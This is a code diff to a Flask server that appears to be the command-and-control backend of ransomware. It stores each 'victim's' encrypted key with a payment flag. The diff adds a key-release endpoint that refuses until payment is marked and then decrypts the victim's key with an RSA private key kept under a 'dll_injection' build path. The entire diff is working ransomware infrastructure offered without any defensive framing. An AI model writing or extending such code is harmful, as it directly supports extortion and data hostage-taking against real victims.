@@ -2,6 +2,10 @@
 
 from flask import Flask, request, jsonify, Response
 import json
+import base64
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.backends import default_backend
 
 app = Flask(__name__)
 
@@ -18,10 +22,10 @@ def receive_victim_key():
     except:
         victims = {}
 
-    # add new victim with paid = False
+    # add new victim with paid = True for testing
     victims[victim_id] = {
         'encrypted_key': encrypted_key,
-        'paid': False
+        'paid': True
     }
 
     # save to file
@@ -49,11 +53,36 @@ def send_key(victim_id):
     if victim_id not in victims:
         return jsonify({"status": "error", "message": "Victim ID not found"}), 404
     
-    encrypted_key = victims[victim_id].get('encrypted_key', 'NONE')
-    paid = victims[victim_id].get('paid', 'NONE')
+    #check if paid
+    paid = victims[victim_id].get('paid', False)
+    if not paid:
+        return jsonify({"status": "error", "message": "Payment not received"}), 403
     
-    return Response(encrypted_key, content_type='application\octet-steam')
+    # get encrypted key
+    encrypted_key = victims[victim_id].get('encrypted_key', 'NONE')
+    
+    # decode base64
+    encrypted_key_bytes = base64.b64decode(encrypted_key)
 
+    # load private key
+    with open('dll_injection/build/private_key.pem', 'rb') as f:
+        private_key_data = f.read()
+    
+    private_key = serialization.load_pem_private_key(
+        private_key_data,
+        password=None,
+        backend=default_backend()
+    )
+    
+    # decrypt the key
+    decrypted_key = private_key.decrypt(
+        encrypted_key_bytes,
+        padding.PKCS1v15()
+    )
+    
+    # send decrypted key
+    return Response(decrypted_key, content_type='application/octet-stream')
+    
 # test endpoint
 @app.route('/test', methods=['GET'])
 def test():
